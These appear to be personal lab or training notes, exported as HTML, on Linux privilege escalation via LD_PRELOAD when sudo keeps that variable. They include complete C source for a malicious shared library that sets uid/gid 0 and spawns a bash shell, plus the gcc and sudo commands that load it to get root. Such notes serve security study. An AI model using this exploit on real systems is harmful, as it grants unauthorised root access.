<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>LD_PRELOAD</title>
</head><body>Escilation via LD_PRELOAD<br/>
<br/>
hard.<br/>
<br/>
start with sudo -l and look for an environemtn variable<br/>
<br/>
&quot;env_keep+=LD_PRELOAD<br/>
<br/>
<img src="image.png"/><br/>
<br/>
also know as preloading. This is preloading a user specifi share library before any other library<br/>
We are laoding our lubrary before others.<br/>
expoiteded by creating a malicious library and loading that before others can load.<br/>
<br/>
write a malicious C code.<br/>
<br/>
<b>#include &lt;stdio.h&gt;<br/>
#include &lt;sys/types.h&gt;<br/>
#include &lt;stdlib.h&gt;<br/>
<br/>
void _init() {<br/>
    unsetenv(&quot;LD_PRELOAD&quot;);<br/>
    setgid(0);<br/>
    setuid(0);<br/>
    system(&quot;/bin/bash&quot;);<br/>
</b><b>}</b><br/>
<br/>
setguid and uid 0 = 0 is root<br/>
<br/>
<br/>
compile the code<br/>
<br/>
<b>gcc -fPIC -shared -o shell.so shell.c -nostartfiles<br/>
<br/>
</b>to run we set the LD_PRELAOD to this code, then run agains anytuhing we can run as root.<b><br/>
</b><b><br/>
</b><img src="image 2.png"/><br/>
<br/>
<br/>
<img src="image 3.png"/>exit<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
Detection<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type: sudo -l<br/>
2. From the output, notice that the LD_PRELOAD environment variable is intact.<br/>
<br/>
Exploitation<br/>
<br/>
1. Open a text editor and type:<br/>
<br/>
#include &lt;stdio.h&gt;<br/>
#include &lt;sys/types.h&gt;<br/>
#include &lt;stdlib.h&gt;<br/>
<br/>
void _init() {<br/>
  unsetenv(&quot;LD_PRELOAD&quot;);<br/>
  setgid(0);<br/>
  setuid(0);<br/>
  system(&quot;/bin/bash&quot;);<br/>
}<br/>
<br/>
2. Save the file as x.c<br/>
3. In command prompt type:<br/>
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles<br/>
4. In command prompt type:<br/>
sudo LD_PRELOAD=/tmp/x.so apache2<br/>
5. In command prompt type: id<br/>
</body></html>